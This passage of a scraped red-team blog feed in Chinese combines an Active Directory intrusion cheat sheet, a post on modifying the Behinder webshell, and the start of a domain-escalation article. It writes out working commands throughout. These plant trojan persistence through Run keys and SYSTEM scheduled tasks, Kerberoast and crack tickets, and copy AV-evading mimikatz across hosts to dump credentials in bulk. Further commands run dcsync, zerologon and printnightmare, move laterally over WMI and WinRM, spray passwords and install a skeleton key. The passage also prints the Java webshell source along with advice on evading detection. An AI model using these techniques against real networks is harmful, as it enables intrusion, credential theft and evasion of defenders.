hosts&quot; | tee -a $filename cat /etc/hosts | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;查看 系统版本&quot; | tee -a $filename cat /etc/*-release | tee -a $filename echo -e &quot;\\n&quot; | tee -a $filename echo &quot;查看 内核版本&quot; | tee -a $filename uname -mrs | tee -a $filename 简易Windows网段探测： @echo off rem 内网存活段自动发现脚本 [Windows] setlocal enabledelayedexpansion for /l %%i in (0,1,255) do ( for /l %%k in (0,1,255) do ( ping -w 1 -n 1 10.%%i.%%k.1 | findstr &quot;TTL=&quot; &gt;nul || ping -w 1 -n 1 10.%%i.%%k.254 | findstr &quot;TTL=&quot; &gt;nul if !errorlevel! equ 0 (echo 10.%%i.%%k.0/24 is alive ! &gt;&gt; alive.txt ) else (echo 10.%%i.%%k.0/24 May be sleeping ! ) ) ) for /l %%s in (16,1,31) do ( for /l %%d in (0,1,255) do ( ping -n 1 -w 1 172.%%s.%%d.1 | findstr &quot;TTL=&quot; &gt;nul || ping -w 1 -n 1 172.%%s.%%d.254 | findstr &quot;TTL=&quot; &gt;nul if !errorlevel! equ 0 (echo 172.%%s.%%d.0/24 is alive ! &gt;&gt; alive.txt ) else (echo 172.%%s.%%d.0/24 May be sleeping ! ) ) ) for /l %%t in (0,1,255) do ( ping -n 1 -w 1 192.168.%%t.1 | findstr &quot;TTL=&quot; &gt;nul || ping -n 1 -w 1 192.168.%%t.254 | findstr &quot;TTL=&quot; &gt;nul if !errorlevel! equ 0 (echo 192.168.%%t.0/24 is alive ! &gt;&gt; alive.txt ) else (echo 192.168.%%t.0/24 May be sleeping ! ) ) 基础维权-自启动: REG query &quot;HKLMSOFTWARE\\Microsoft\\WindowslCurrent Version\\Run&quot; REG ADD &quot;HKLMSOFTWARE\\Microsoft\\WindowslCurrentVersion\\Run&quot;/V&quot;SysDebug&quot;/t REG_SZ/F /D&quot;c:\\windows\\debug\\SysDebug.exe reg delete &quot;HKLMSOFTWARE\\Microsoft\\WindowslCurrentVersion\\Run&quot;/V&quot;SysDebug&quot;/f 高权限计划任务: schtasks /create /RL HIGHEST /F /tn &quot;SysDebug&quot; /tr &quot;c:\\windows\\debug\\SysDebug.exe&quot;/sc DAILY /mo 1 /ST 10:05/RU SYSTEM schtasks /query I findstr &quot;SysDebug&quot; schtasks /run /tn &quot;SysDebug&quot; schtasks /delete /F /tn &quot;SysDebug&quot; schtasks /tn &quot;SysDebug&quot; /query /fo list/v 低权限计划任务: schtasks /create/F/tn&quot;SysDebug&quot;/tr&quot;D:\\用户文档\\sixj\\ContactslSysDebug.exe&quot;/sc DAILY/mo1/ST10:05 schtasks /query I findstr &quot;SysDebug&quot; schtasks /run /tn &quot;SysDebug&quot; schtasks/delete/F/tn&quot;SysDebug&quot; schtasks /tn &quot;SysDebug&quot; /query /fo list /v 单机信息收集： # 1. 基础的各类文件，关键字定位： getFile.exe all # 自研文件查找工具 # 2. 主机安装的软件，确定主机类型： wmic OS get Caption，CSDVersion，Version，OSArchitecture # 3. 一把soha，拖回本地分析 Seatable.exe all # # 4. 重点关注进程中敏感软件,确认是否存在凭证 tasklist /svc | findstr &quot;*Mail*&quot;,&quot;KeePass&quot; AD域渗透-重中之重 findstr /c:&quot;userName=&quot; /c:&quot;cpassword=&quot;/si Nad\\sysvol\\xxxx.com\\policiesl*.xml net time/domain&amp;&amp;net view ad&amp;&amp;dir lladNETLOGON&amp;&amp;type llad\\NETLOGONchapwd.cmd AD域渗透-域内信息收集: powershell-import/home/xxxx/Desktop/SharpHound.ps1 powershell Invoke-BloodHound-CollectionMethod All execate assembly BloodHound.exe AD域渗透-获取用户票据、凭证： # 通过vbs获取： cscript GetUserSPN.vbs # 通过Rubeus获取服务票据Hash，hashcat离线爆破： Rubues.exe kerberoast hashcat.exe -m 13100 hash.txt -a 3 -1 ?1?d?s?1?1?1?1?1?1 AD域渗透-SMB扫描（快速获取内网Windows） 1.原始nbtscan.exe，实战需要处理： nbtscan.exe 10.10.10.0/16 &gt;&gt; smb.txt 2. fscan.exe, 实战也要处理： fscan.exe -h 10.10.10.0/16 -m nbtbios -o smb.txt 3. 苛刻环境，正向代理： msf代理进去，线程拉低10，选择模块smb_version探测 4. cme Windows主机探测,实战自行编译免杀处理 cme.exe -t 10.10.10.0/24 tasklist /svc | findstr &quot;cme.exe&quot; 5. SharpNetInfoScan 基于139端口解析： SharpNetInfoScan.exe -h 10.10.10.10/24 6. 基于SPN结果，进行windows探测： grep 'CN=' spn.txt | awk -F ','{'print $1'} | awk -F '=' {'print$2'} &gt; host.txt tail -n 30 host.txt for /f &quot;delims=&quot; %i in host.txt do @ping -w 1 -n 1 %i | findstr /c:&quot;.xxx.com|&quot; &gt;&gt; host_res.txt # Windwos 7 以后都默认自带setspn setspn T DC-Name Q */* | findstr &quot;MSSQLSvc&quot; # 直接过滤Mssql服务 # 因为得到的spn结果，可能都不存活，我们批量Ping一下，判断存活 awk F &quot;/&quot; {'print $2'} mac.txt | awk F &quot;.&quot; {'print $1'} | uniq &gt; res.txt for /f &quot;delims=&quot; %i in (res.txt) do @ping w 1 n 1 %i | findstr /c:&quot; DC-name &quot; &gt;&gt; PerfLogs news.txt setspn T dc-name Q */* | findstr &quot;oracle&quot; # 同理过滤“Oracle服务”，其他同类数据库服务也如此 借助 SPN 快速 定位当前目标 域中 所有 存活 的 ldap 服务器： # 通常情况下，都为域控制器 setspn T dc-name Q */* | findstr &quot;ldap&quot; # 所有 LDAP SPN 的 机器名 都带有典型 的 DC 字样 借助 SPN 快速 定位当前目标 域中 邮件 服务器： setspn T dc-name Q */* | findstr &quot;exchangeMDB&quot; setspn T dc-name Q */* | findstr &quot;SMTPSVC&quot; setspn T dc-name Q */* | findstr &quot;IMAP&quot;c v setspn T dc-name Q */* | findstr &quot;POP3&quot; awk F '/' {'print $2'} mail.txt | awk F '.' {'print $1'} | uniq # 筛选各类主机名 # 批量存活探测 for /f &quot;delims=&quot; %i in (mail.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; mail-re.txt 借助 SPN 快速 定位当前目标 域中 Web 服务器： setspn T dc-name Q */* | findstr &quot;HTTP&quot; setspn T dc-name Q */* | findstr &quot;HTTPS&quot; for /f &quot;delims=&quot; %i in (webs.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; # Web服务 借助 SPN 快速 定位当前 目标 域 中 所有 存活的 DNS 服务器 setspn T dc-name Q */* | findstr &quot;DNS&quot; for /f &quot;delims=&quot; %i in (dns.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; dns.txt 借助 SPN 快速 定位当前 目标 域 中 所有 存活的 文件 服务器 setspn T dc-name Q */* | findstr &quot;ftp&quot; setspn T dc-name Q */* | findstr &quot;nfs&quot; for /f &quot;delims=&quot; %i in (ftp.txt) do @ping w 1 n 1 %i | findstr /c:&quot; dc-name &quot; &gt;&gt; dns.txt 借助 SPN 快速 定位当前 目标 域 中 所有 开启远程 连接服务 服务器 setspn T dc-name Q */* | findstr &quot;TERMSRV&quot; &gt;&gt;&gt; PerfLogs rdp .txt setspn T dc-name Q */* | findstr &quot;WSMAN&quot; &gt;&gt; C: PerfLogs winrm .txt setspn T dc-name Q */* | findstr &quot;vnc&quot; &gt;&gt; C: PerfLogs vnc .txt setspn T dc-name Q */* | findstr &quot;vpn&quot; &gt;&gt; C: PerfLogs vpn .txt setspn T dc-name Q */* | findstr &quot;tnetdgines&quot; &gt;&gt; C: PerfLogs tnetdgines .txt awk F '/' {'print $2'} **.txt | awk F '.' {'print $1'} | uniq | wc -l AD域渗透-外网资产/内网资产定位： grep 'CN=' spn.txt | awk -F ','{'print $1'} | awk -F '=' {'print $2'} &gt; host_res.txt # Linux:(筛选重点主机) egrep -i 'sql|file|vpn|mail|smtp|pop|imap|web|share|monitor|erp|login|oa|print|server|vcenter|vm' # 准备目标外网各类域名，汇总文件domain.txt for /f &quot;delims=&quot; %i in (domain.txt) do @ping -w 1 -n 1 %i | findstr /c:&quot;[10.&quot; /c:&quot;[192.&quot; /c:&quot;[172.&quot; &gt;&gt; web-out.txt # 通过以上的方法获取到大致的C段，批量进行webTitle识别，确定对应段的各类应用： 1. fscan获取WebTitle/指纹 fscan.exe -hf target.txt -nopoc -nop -o title.txt 2. Ladon Ladon.exe WhatWeb 10.10.10.0/16 &gt;&gt; title.txt 3. 苛刻环境，存活探测： for /l %i in (1,1,255) do @ping 192.168.0.%i -w 1 -n 1 | find /i &quot;ttl&quot;导出成文本： @for /l %i in (1,1,255) do @ping -n 1 -w 40 192.168.0.%i &amp; if errorlevel 1 (echo 192.168.0.%i&gt;&gt;c:\\a.txt) else (echo 192.168.0.%i &gt;&gt;c:\\b.txt) AD域渗透-信息收集 贯穿横向每个阶段，拿到一部分权限，就来一次 1. 批量抓进程，筛选敏感进程，敏感用户，有大概六直接伪造Token实现获取域控权限： （1） atexec 实现获取进程列表，保存本地，手工筛选 ## 本机操作： mimikatz进行注入，注入目标主机票据，把本机挂代理进去，后续进行操作： atexec.exe ./administrator:loecho@123..@10.10.10.1 &quot;tasklist&quot; ## 被控机操作： 将当前Beacon注入到对应进程，获取目标权限 atexec.exe ./administrator:loecho@123..@10.10.10.1 &quot;tasklist&quot; ## 1. 批量抓，假设用户密码一样，后续筛选重点进程： for /f &quot; %i in win2success.txt do atexec.exe ./administrator:loecho123..@i &gt;&gt; allTasklist.txt # 筛选重点进程，杀软、数据库、phpstudy、vpn、域管用户（域管理员实际目标名称添加）等等 egrep 'cily|adadmin|adadmin02|xxxx-igrp|leagsoft|shenluyan|xiefp|wulh|sunyingyun|zhangx' process.txt ## 2. 不依赖工具抓，自身tasklist for /f %i in (ip.txt) do echo %i &gt;&gt; process.txt &amp; tasklist /s %i/u &quot;.\\administrator&quot; /p &quot;loecho123..&quot; /V /FO CSV &gt;&gt; process.txt egrep 'cily|adadmin|adadmin02|xxxx-igrp|leagsoft|shenluyan|xiefp|wulh|sunyingyun|zhangx' process.txt 批量抓已获取口令主机的Hash、密码： （抓密码工具一定要免杀，或者你直接把lsass.exe Dump下离线解密也可以） 手工搞，依赖计划任务，files64.exe为修改版免杀MImikatz一键版本： for /f %i in (ip.txt) do net use N%i\\admin$/user:&quot;administrator&quot; &quot;IT1231&quot; &amp; if %errorlevel% equ 0(copy files64.exe \\%iladmin$\\debug\\/Y)&amp; schtasks /create/s&quot;%i&quot;/u &quot;administrator&quot;/p &quot;IT1231&quot; /RL HIGHEST /F/tn&quot;SysDebug&quot;/tr&quot;c:\\windows\\debug\\files64.exe&quot;/sc DAILY/mo1/ST07:25/RUSYSTEM&amp;schtasks/run/tnSysDebug/s&quot;%i&quot;/U &quot;administrator&quot;/P &quot;IT1231&quot;&amp; schtasks/delete/F/tn SysDebug/s&quot;%i&quot;/U&quot;administrator&quot;/P&quot;IT1231&quot;&amp;@ping 127.0.0.0.1 -n 1 &gt;nul &amp; move W%i\\admin$\\temp\\dumps.logs C:\\Users\\Public\\%i.logs &amp; del W%i\\admin$\\debug\\files64.exe/F&amp;net use N%i\\admin$/del (2) WMIC直接搞 for /f %i in (ip.txt) do net use 11%i\\adminS/user:&quot;administrator&quot; &quot;IT1231&quot; &amp; if %errorlevel% equ 0(copy files64.exe ll%i\\admin$\\debug\\/Y) &amp; wmic/NODE:&quot;%i&quot; /user:&quot;administrator&quot; /password:&quot;IT1231&quot; PROCESS call create &quot;c:\\windows\\debug\\files64.exe&quot; &amp; @ping 127.0.0.1-n3&gt;nul &amp; move N%i\\adminS\\temp\\dumps.logs C:\\Users\\Publicl%i.logs &amp; del 11%iladminS\\debuglfiles64.exe/F net use N%iladmin$/del (3) 依赖SharpKatz工具，免杀处理： SharpKatz_x64.exe -h Example: SharpKatz.exe --Command logonpasswords Example: SharpKatz.exe --Command ekeys Example: SharpKatz.exe --Command msv Example: SharpKatz.exe --Command kerberos Example: SharpKatz.exe --Command tspkg Example: SharpKatz.exe --Command credman Example: SharpKatz.exe --Command wdigest Example: SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc Example: SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc Example: SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc Example: SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash Example: SharpKatz.exe --Command pth --User username --Domain userdomain --Rc4 rc4key Example: SharpKatz.exe --Command pth --Luid luid --NtlmHash ntlmhash Example: SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes128 aes256 Example: SharpKatz.exe --Command zerologon --Mode check --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ Example: SharpKatz.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ Example: SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local Example: SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll Example: SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom Example: SharpKatz.exe --Command hiveghtmare Example: SharpKatz.exe --Command dumpsam --System \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM --Sam \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM Example: SharpKatz.exe --Command listshadows (4) 各类软件密码解密： 360 安全浏览器 Chrome 解密 Firefox 解密 Flashfxp 解密 Foxmail 邮件客户端解密 IIS 解密 MobaXterm 解密 Navicat 解密 PlSQL解密 Royal TS 离线解密 SecureCRT 解密 SSMS 客户端解密 Thunderbird 离线解密 TortoiseSVN 解密 VNC 解密 WinSCP 解密 Xshell Xftp 解密 # MySQL数据库： 1. 将目标mysql/data/mysql/user.MYD mysql/data/mysql/user.frm mysql/data/mysql/user.MYI 下载回本地 2. 拖到自己mySQL的对应目录下，修改参数：skip-grant-tables 3. 连接数据库，查询select host，user，password from user，CMD5查一下对应Hash # MSSQL数据库： 1. mimikatz&quot;privilege::debug&quot;sekurlsa:pth/user:administrator/domain:./ntlm:hash /run:\\&quot;C:\\*\\SocksCap64\\SocksCap64_RunAsAdmin.exel&quot;&quot; &quot;exit&quot; 2. 代理挂进去，通过Windows身份认证直接连接，MSSQL数据库 AD域渗透-横向渗透WINRM（5985): 条件: 1、适用于 win7 及以后的系统，win7 和 server 08 默认关闭 2、server 12 之后的版本才默认允许远程任意主机进行管理 3、防火墙未过滤 5985、5986 端口 1. 自带工具： #查看WinRM状态 winrm enumerate winrm/config/listener #开启WinRM远程管理 Enable-PSRemoting –force #设置WinRM自启动 Set-Service WinRM -StartMode Automatic #对WinRM服务进行快速配置，包括开启WinRM和开启防火墙异常检测,默认的5985端口 winrm quickconfig -q #对WinRM服务进行快速配置，包括开启WinRM和开启防火墙异常检测，HTTPS传输，5986端口 winrm quickconfig -transport:https #查看WinRM的配置 winrm get winrm/config #查看WinRM的监听器 winrm e winrm/config/listener #为WinRM服务配置认证 winrm set winrm/config/service/auth '@{Basic=&quot;true&quot;}' #修改WinRM默认端口 winrm set winrm/config/client/DefaultPorts '@{HTTPS=&quot;8888&quot;}' #为WinRM服务配置加密方式为允许非加密： winrm set winrm/config/service '@{AllowUnencrypted=&quot;true&quot;}' #设置只允许指定IP远程连接WinRM winrm set winrm/config/Client '@{TrustedHosts=&quot;192.168.10.*&quot;}' #执行命令 winrm invoke create wmicimv2/win32_process -SkipCAcheck -skipCNcheck '@{commandline=&quot;calc.exe&quot;}' #在dc机器上面执行命令并且指定用户名和密码 winrm invoke Create wmicimv2/win32_process @{CommandLine=&quot;calc.exe&quot;} -r:dc -u:one\\administrator -p:q123456. winrs -r:192.168.22.33 -u:administrator -p:p@assw0rd ipconfig 2. https://github.com/Hackplayers/evil-winrm # 开源工具 3.https://github.com/bohops/WSMan-WinRM # 集合攻击，包括exe、ps1、js等 Usage SharpWSManWinRM.cs Usage: SharpWSManWinRM.exe &lt;hostname&gt; &lt;command&gt; Usage: SharpWSManWinRM.exe &lt;hostname&gt; &lt;command&gt; &lt;domain\\user&gt; &lt;password&gt; Example: SharpWSManWinRM.exe host.domain.local notepad.exe Example: SharpWSManWinRM.exe host.domain.local &quot;cmd /c notepad.exe&quot; domain\\joe.user P@ssw0rd WSManWinRM.ps1 Usage: Invoke-WSManWinRM -hostname &lt;hostname&gt; -command &lt;command&gt; Usage: Invoke-WSManWinRM -hostname &lt;hostname&gt; -command &lt;command&gt; -user &lt;domain\\user&gt; -password &lt;password&gt; Example: import-module .\\WSManWinRM.ps1 Invoke-WSManWinRM -hostname MyServer.domain.local -command calc.exe Example: import-module .\\WSManWinRM.ps1 Invoke-WSManWinRM -hostname MyServer.domain.local -command calc.exe -user domain\\joe.user -password P@ssw0rd WSManWinRM.vbs Usage: cscript.exe SharpWSManWinRM.vbs &lt;hostname&gt; &lt;command&gt; Usage: cscript.exe SharpWSManWinRM.vbs &lt;hostname&gt; &lt;command&gt; &lt;domain\\user&gt; &lt;password&gt; Example: cscript.exe SharpWSManWinRM.vbs host.domain.local notepad.exe Example: cscript.exe SharpWSManWinRM.vbs host.domain.local &quot;cmd /c notepad.exe&quot; domain\\joe.user P@ssw0rd WSManWinRM.js Usage: cscript.exe SharpWSManWinRM.js &lt;hostname&gt; &lt;command&gt; Usage: cscript.exe SharpWSManWinRM.js &lt;hostname&gt; &lt;command&gt; &lt;domain\\user&gt; &lt;password&gt; Example: cscript.exe SharpWSManWinRM.js host.domain.local notepad.exe Example: cscript.exe SharpWSManWinRM.js host.domain.local &quot;cmd /c notepad.exe&quot; domain\\joe.user P@ssw0rd CppWSManWinRM.cpp Usage: CppWSManWinRM.exe &lt;hostname&gt; &lt;command&gt; Example: CppWSManWinRM.exe host.domain.local notepad.exe Note: Username/password option does not work yet AD域渗透-横向渗透SMB(445)： # 汇总以获取到的各类密码，如数据库密码，主机hash解密密码，文件保存密码等等 1. fscan SMB模块探测： fscan.exe -hf smb.txt -pf pwd.txt -o smb2win.txt 2. crack 弱口令检测： for /c &quot;delims=&quot; %i in smb.txt do crack.exe -i %i -P pwd.txt -U user.txt &gt;&gt; smb2win.txt 3. 国内目标，代理流畅情况下： （1） 超级弱口令工具，用代理挂进内网，进行扫描 （2）MSF的smb_login挂进内网，指定文件smb.txt，进行扫描 AD域渗透-横向渗透WMIC（139/135）： 注意：（手艺活不能丢了，上线后维权，操作基于用户权限，不要SYSTEM权限） 1. 手工搞，直接执行SysDebug.exe,目标10.10.10.1，用户名：administrator 密码：loecho@123.. 木马：SysDebug.exe ：(只能执行一次) net use \\\\10.10.10.1\\admin$ /user:&quot;administrator&quot; &quot;loecho@123..&quot; copy SysDebug.exe \\\\10.10.10.1\\admin$\\debug wmic /NODE:&quot;10.10.10.1&quot; /user:&quot;administrator&quot; /password:&quot;loecho@123..&quot; PROCESS call create &quot;C:\\Windows\\Debug\\SysDebug.exe&quot; del \\\\10.10.10.1\\admin$\\debug\\SysDebug.exe /F net use \\\\10.10.10.1\\admin$ /del 2. 远程计划任务 schtasks / create /s &quot;10.10.10.1&quot; / u &quot;administrator&quot; / p &quot;loecho@123..&quot; / RL HIGHEST /F /tn &quot;SysDebug&quot; /tr c:\\windows\\debug\\SysDebug.exe&quot;/sc DAILY/mo 1/ST 08:25/RU SYSTEM schtasks /query /s &quot;10.10.10.1&quot; /U &quot;administrator&quot; /P &quot;loecho@123..&quot; | findstr &quot;SysDebug&quot; schtasks /run /tn SysDebug /s &quot;10.10.10.1&quot; /U &quot; administrator&quot; /P &quot;loecho@123..&quot; schtasks /delete /F /tn SysDebug /s &quot;10.10.10.1&quot; /U &quot; administrator&quot; /P &quot;loecho123..&quot; 3. WMIHACKER 进行横向：（https://github.com/rootclay/WMIHACKER/blob/master/README_zh.md） C:\\Users\\administrator\\Desktop&gt;cscript //nologo WMIHACKER_0.6.vbs __ ____ __ _____ _ _ _____ _ ________ _____ \\ \\ / / \\/ |_ _| | | | | /\\ / ____| |/ / ____| __ \\ \\ \\ /\\ / /| \\ / | | | | |__| | / \\ | | | ' /| |__ | |__) | \\ \\/ \\/ / | |\\/| | | | | __ | / /\\ \\| | | &lt; | __| | _ / \\ /\\ / | | | |_| |_ | | | |/ ____ \\ |____| . \\| |____| | \\ \\ \\/ \\/ |_| |_|_____| |_| |_/_/ \\_\\_____|_|\\_\\______|_| \\_\\ v0.6beta By. Xiangshan@360RedTeam Usage: WMIHACKER.vbs /cmd host user pass command GETRES? WMIHACKER.vbs /shell host user pass WMIHACKER.vbs /upload host user pass localpath remotepath WMIHACKER.vbs /download host user pass localpath remotepath /cmd single command mode host hostname or IP address GETRES? Res Need Or Not, Use 1 Or 0 command the command to run on remote host 有命令回显执行方式 &gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo&quot; 1 无命令回显 &gt; cscript WMIHACKER_0.6.vbs /cmd 172.16.94.187 administrator &quot;Password!&quot; &quot;systeminfo &gt; c:\\1.txt&quot; 0 模拟shell模式 &gt; cscript WMIHACKER_0.6.vbs /shell 172.16.94.187 administrator &quot;Password!&quot; 文件上传-复制本机calc.exe到远程主机c:\\calc.exe &gt; cscript wmihacker_0.4.vbe /upload 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\\windows\\system32\\calc.exe&quot; &quot;c:\\calc&quot; 文件下载-下载远程主机calc.exe到本地c:\\calc.exe &gt; cscript wmihacker_0.4.vbe /download 172.16.94.187 administrator &quot;Password!&quot; &quot;c:\\calc&quot; &quot;c:\\windows\\system32\\calc.exe&quot; # 暂时还能过 360, 如卡住多试几次就好, 单纯的远程执行下命令没啥问题 cscript //nologo wmihacker.vbs /cmd 192.168.159.7 administrator &quot;admin!@#45&quot; &quot;tasklist&quot; 1 cscript //nologo wmihacker.vbs /cmd 192.168.159.19 klion\\its &quot;admin!@#45&quot; &quot;query user&quot; 1 # 由于程序内部还是用批处理在循环取结果, 默认直接调的 cmd.exe 会触发 360 拦截, 取不到结果 WMIcmd.exe -h 192.168.159.19 -u its -p admin!@#45 -d klion -c &quot;systeminfo&quot; -s 50000 WMIcmd.exe -h 192.168.159.7 -u administrator -p admin!@#45 -d . -c &quot;systeminfo&quot; -s 50000 # 无法在命令里执行重定向操作, 会触发 360 报警 cscript wmiexec.vbs /cmd 192.168.159.7 .\\administrator admin!@#45 &quot;netstat -ano -wait8000&quot; cscript wmiexec.vbs /cmd 192.168.159.19 klion\\its admin!@#45 &quot;query user -wait8000&quot; AD域渗透-横向渗透RDP（3389） 假设拿到DMZ区域的WEB服务器,DumpHash后，获得密码格式 # IP： 10.10.10.130 密码： ABCD130!@. # 仔细划分为三部分： # ABCD 目标公司名称简称 # 130 目标系统IP的C段地址 # !@. 密码策略问题，加的特殊字符 # 由此可以猜测主机内其他机器管理员密码情况，从而定点横向，从WEB到数据库从数据库到核心。。。。 （2） 通过高权限用户配合高密码进行横向RDP喷射 高权限域用户，Dump到明文密码，3389端口开启： RDP端口查看方式： # 通过注册表查询3389 REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections # 查看RDP服务是否开启：1关闭，0开启 REG QUERY &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber # 查看RDP服务的端口 # 通过进程查看 tasklist /svc | find &quot;TermService&quot; # 找到对应服务进程的PID netstat -ano | find &quot;3220&quot; # 找到进程对应的端口号 # 通过监听端口查看 netstat -ano | findstr LIS # 查看当前监听端口，有些情况可能RDP端口更改 强开RDP端口方法: # 注册表开启，高权限用户： REG ADD &quot;HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server&quot; /v fDenyTSConnections /t REG_DWORD /d 00000000 /f REG ADD &quot;HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp&quot; /v PortNumber /t REG_DWORD /d 0x00000d3d /f # 监听 3389 端口 # 注册表文件开启，高权限用户： Windows Registry Editor Version 5.00 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server] &quot;fDenyTSConnections&quot;=dword:00000000 [HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\\WinStations\\RDP-Tcp] &quot;PortNumber&quot;=dword:00000d3d # Wmic启动远程主机RDP服务： wmic /node: &quot;10.10.10.130&quot; /USER:&quot;10.10.10.130\\administrator&quot; PATH win32_erminalservicesetting WHERE (__Class!=&quot;&quot;) 2. 国内目标，网络环境稳定： 超级弱口令工具，挂代理进去内网进行，3389的密码碰撞 （通常SMB喷射完的目标，就以这种方法去连3389） AD域渗透-万能密码： # 所有用户通用密码，skeleton，重启失效 mimikatz.exe privilege::debug &quot;misc::skeleton&quot; AD域渗透-通过目标各类服务漏洞，进行横向渗透 （WEB-Nday、Redis、MSSQL-RCE、MYSQL提权） ","link":"https://1oecho.github.io/GxKPsWfW5/"},{"title":"红队开发: Behinder3-Beta11 实战下的二次开发 （2）","content":"0x01 实战痛点 数据传输: AES + BASE64 数据包传递，传输过程被安全设备抓取特征 webshell: 静态查杀，敏感关键字和敏感方法被设备查杀 实战功能: 提高效率的功能，机械的操作 0x02 原理分析（JAVA-webshell为例） [+] 原版java-webshell： &lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;&gt; &lt;%!class U extends ClassLoader{ U(ClassLoader c){super(c); //创建U类继承ClassLoader } public Class g(byte []b){ // 自定义一个g成员方法，接受字节类型的参数 return super.defineClass(b,0,b.length); // 调用父类的defineClass 动态解析字节码返回 Class 对象 } }%&gt; &lt;%if (request.getMethod().equals(&quot;POST&quot;)){ // 实例化类调用equals方法， String k=&quot;1a1dc91c907325c6&quot;;/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/ session.putValue(&quot;u&quot;,k); // byte[] add Cipher c=Cipher.getInstance(&quot;AES&quot;); c.init(2,new SecretKeySpec(k.getBytes(),&quot;AES&quot;)); // AES 解密 new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);// base64编码，获取去一段bayte[],后续difineClass，获取到class，再通过newInstance()获取到类，重写equle方法，传递pageContext }%&gt; [+] 客户端-代码结构： [+] Payload目录内容： [+] 修改步骤： ① 添加新的加/解密类 文件名：core\\Crypt.java 和 core\\Decrypt.java ② 添加Payload文件夹创建新类型的功能代码 文件名：payload\\new-type\\..... ③ 添加新的参数处理 文件名：core\\Params.java ④ 添加新的数据发送 文件名：Utils\\Utils.java ⑤ 添加新的连接逻辑 文件名：MainController.java 0x03 实战的需求 ① 静态查杀的绕过： 一 关键字扫描： c.init(2, new SecretKeySpec(k.getBytes(), &quot;AES&quot;)); U demo = new U(this.getClass().getClassLoader()); newInstance() getClassLoader() doFinal() 解决方式： 类型转换，将敏感参数进行转换，避免出现关键字 strToByte uniocde 类加载模式，通过类加载配合各种编码解码 java语言的特性，\\u000d 实际上是一个换行符，语言识别为注释 二 固定webshell-Hash 固定webshell大小 静态原版webshell，通常情况下，hash被记录，普通杀毒会查杀 未修改密码，默认密码被当作识别特征（behinder3密码通常为任意字符串MD5的前16位） 解决方式： 随机填充无用的代码或者无用注释 自定义密码添加即可 随用随生成webwhell [+] 实现效果： 同密码、同类型webshell Hash对比： 静态查杀结果： ② 动态数据传输绕过： 2.0 存在密钥交互的特征 数据包的 Content-Type 结合数据内容 数据包的请求方式POST 解决办法: 修改数据交互中的数据包特征，可以配合正常网页内容特定地区加密内容 修改数据返回包的数据类型，自定义解析规则 修改数据传输的方式，通过multipart/form-data方式进行数据传 数据包增加垃圾数据，通过特定标识符提取需要的返回值 数据交互方式,简单以multipart/form-data为例子： 数据传输将返回数据封装png头： ","link":"https://1oecho.github.io/Behinder11-2/"},{"title":"内网渗透: 基础域渗透快速获取域控权限","content":" 0x01 最终目标 域控权限（域控目的时是控制运维机） 运维机（运维机目的是内网核心） 内网核心以及核心业务段 0x02 基本方法： [+] 常用快速获取域控权限的方法 [+] 查找SYSVOL和组策略首选项中保存的密码 参考链接: 域渗透——利用SYSVOL还原组策略中保存的密码 # 在域中，存在一个默认的共享路径： # \\\\&lt;DOMAIN&gt;\\SYSVOL\\&lt;DOMAIN&gt;\\ # 所有域内主机都能访问，里面保存组策略相关数据，包含登录脚本配置文件等 # 测试主机所在域为 de1ay.com，可访问共享文件夹\\\\de1ay.com\\SYSVOL\\de1ay.com # 域管理员在使用组策略批量管理域内主机时，如果配置组策略的过程中需要填入密码，那么该密码会被保存到共享文件夹\\SYSVOL下，默认所有域内用户可访问，虽然被加密，但很容易被解密,获取到密码信息,通过Powershell脚本进行解密 常见存在敏感信息的XML文件： 组策略中可被利用的地方不只在修改管理员密码的位置，还包括以下： Services\\Services.xml http://msdn.microsoft.com/en-us/library/cc980070(v=prot.13) ScheduledTasks\\ScheduledTasks.xml http://msdn.microsoft.com/en-us/library/cc422920(v=prot.13) http://msdn.microsoft.com/en-us/library/dd341350(v=prot.13) http://msdn.microsoft.com/en-us/library/dd304114(v=prot.13) Printers\\Printers.xml http://msdn.microsoft.com/en-us/library/cc422918(v=prot.13) Drives\\Drives.xml http://msdn.microsoft.com/en-us/library/cc704598(v=prot.13) DataSources\\DataSources.xml 